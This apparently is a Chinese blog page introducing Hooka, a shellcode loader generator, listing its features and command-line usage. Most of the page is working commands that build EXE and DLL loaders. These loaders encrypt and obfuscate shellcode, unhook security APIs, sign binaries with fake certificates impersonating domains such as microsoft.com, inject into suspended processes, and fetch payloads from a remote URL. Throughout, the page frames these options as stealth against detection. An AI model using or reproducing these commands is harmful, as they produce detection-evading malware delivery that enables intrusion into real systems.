 ...
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   ...
   <div class="htmledit_views" id="content_views">
    ...
    <pre><code>https://github.com/D3Ext/Hooka.git
</code></pre>
    <h3>
     功能
    </h3>
    ...
    <pre><code>从原始文件、PE、DLL 或 URL 获取 shellcode
...
Windows API 哈希
    ...
    <pre><code>使用假证书或真实证书对 shellcode 加载程序进行签名
通过 Caesar 密码进行字符串混淆
...
计算 MD5、SHA1 和 SHA256 校验和以跟踪加载程序
    ...
    <pre><code>git clone https://github.com/D3Ext/Hooka
cd Hooka
make
</code></pre>
    <h3>
    ...
    <pre><code>-i, --input 字符串 有效负载以原始格式注入，如 PE、DLL 或从 URL 注入
...
-f, --format 要生成的有效负载的字符串格式（可用：exe、dll）（默认 EXE）
    ...
    <pre><code>--proc string 字符串进程，在给定执行技术需要时生成（处于暂停状态）（默认 notepad.exe）
...
  No-RWX
    ...
    <pre><code>-a, --arch string 要生成的 loader 的架构（默认 amd64）
...
-d, --domain string 用于对加载程序进行签名的域（即 www.microsoft.com）
    ...
    <pre><code>--enc string 使用给定的算法加密 shellcode（可用：AES、3DES、RC4、XOR）（默认无）
...
--strings 使用 Caesar cipher 混淆字符串
    ...
    <pre><code>--unhook string 解钩技术 （available： full， peruns）
...
--sleep 使用自定义 sleep 函数延迟 shellcode 执行
    ...
    <pre><code>--calc 使用 calc.exe shellcode 来测试 loader 功能（不提供输入文件）
...
-h, --help 打印帮助面板
    ...
    <pre><code>hooka -i shellcode.bin -o loader.exe
hooka -i http://192.168.1.126/shellcode.bin -o loader.exe
    ...
    <pre><code>hooka -i shellcode.bin -o loader.exe --exec NtCreateThreadEx --unhook full --sleep --acg
</code></pre>
    <h4>
     隐蔽增强
    </h4>
    ...
    <pre><code>hooka -i shellcode.bin -o loader.dll --domain www.domain.com --enc aes --verbose
</code></pre>
    <h4>
     生成简单的 EXE 加载程序
    </h4>
    <pre><code>$ hooka_linux_amd64 -i shellcode.bin -o loader.exe
</code></pre>
    <h4>
     生成 DLL 加载程序
    </h4>
    <pre><code>$ hooka_linux_amd64 -i shellcode.bin -o loader.dll -f dll
</code></pre>
    <h4>
     使用自定义配置（各种示例）
    </h4>
    ...
    <pre><code>$ hooka_linux_amd64 -i shellcode.bin -o loader.exe --hashing --agc --sleep --verbose
...
$ hooka_linux_amd64 --calc -o loader.exe --user "DESKTOP-E1D6G0Atom" --computername "DESKTOP-E1D6G0A" --compress --strings
    ...
    <p class="img-center">
     <img alt="" height="742" src="https://i-blog.csdnimg.cn/img_convert/23c58c5029911e77842b5e8e1e3d8a3a.png" width="1862"/>
    </p>
    <p>
    </p>
    <p class="img-center">
     <img alt="" height="558" src="https://i-blog.csdnimg.cn/img_convert/2d1b724071b11e43d88d672dfb35805e.png" width="1868"/>
    </p>
    <h3>
     注意事项
    </h3>
    ...
    <ul>
     <li>
      <p>
       ...
       ：提交问题或功能请求至
       <a href="https://github.com/D3Ext/Hooka/issues" title="项目 Issues 页面">
        项目 Issues 页面
       </a>
       。
      </p>
    ...
    <ul>
     <li>
      <p>
       <a href="https://github.com/D3Ext/Hooka" title="Hooka GitHub 项目">
        Hooka GitHub 项目
       </a>
      </p>
     </li>
     <li>
      <p>
       <a href="https://github.com/rapid7/metasploit-framework/wiki/Shikata-Ga-Nai" title="Shikata Ga Nai 编码">
        Shikata Ga Nai 编码
       </a>
      </p>
     </li>
     <li>
      <p>
       <a href="https://upx.github.io/" rel="nofollow" title="UPX 压缩工具">
        UPX 压缩工具
       </a>
      </p>
     </li>
 ...
 <p alt="68747470733a2f2f62:6c6f672e6373646e2e6e65742f71715f34323332313139302f:61727469636c652f64657461696c732f313436333031343039" class_="artid" style="display:none">
 </p>
</div>
